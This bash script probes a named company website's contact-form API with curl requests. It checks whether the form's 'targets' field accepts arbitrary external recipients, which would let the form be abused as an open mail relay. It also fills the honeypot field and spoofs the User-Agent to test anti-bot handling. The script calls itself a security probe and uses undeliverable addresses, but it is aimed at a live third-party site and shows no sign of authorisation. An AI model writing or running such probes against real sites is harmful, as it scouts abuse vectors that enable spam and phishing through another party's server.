#!/bin/bash
# Probe WHERE the /api/send handler draws its line: is 'targets' validated at all,
# or is the only thing stopping abuse the provider's monthly quota?
# Non-deliverable / reserved addresses only -> no mail actually leaves the building.
BASE="https://www.infinitycapital.bh/api/send"

post () { # $1=targets  $2=label
  printf 'targets=%-34s -> ' "$1"
  curl -s -X POST "$BASE" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/120" \
    -F "fname=RelayVerify" -F "lname=Tester" -F "areacode=+973" -F "tel=0000" \
    -F "cname=Security Verifier" -F "subject=relay boundary probe" \
    -F "msg=security verification probe - please ignore" \
    -F "check=bot-filled-honeypot" -F "targets=$1"
  echo
}

echo "### 1. omission controls (should be 4xx to prove endpoint is NOT wide open to anyone at all) ###"
printf 'OMIT targets            -> '
curl -s -X POST "$BASE" -H "User-Agent: Mozilla/5.0" -F "fname=a" -F "lname=b" -F "msg=x" -F "check=" 
echo; printf 'EMPTY targets           -> '
curl -s -X POST "$BASE" -H "User-Agent: Mozilla/5.0" -F "fname=a" -F "lname=b" -F "msg=x" -F "check=" -F "targets="
echo; printf 'OMIT check (honeypot)   -> '
curl -s -X POST "$BASE" -H "User-Agent: Mozilla/5.0" -F "fname=a" -F "lname=b" -F "msg=x" -F "targets=inbox@unreachable.invalid"
echo

echo "### 2. arbitrary external (non-site) recipient - .invalid TLD never delivers, but the"
echo "###    server still processed it and handed it to the mail provider. Non-deliverable address."
post "inbox@unreachable.invalid" "ext"
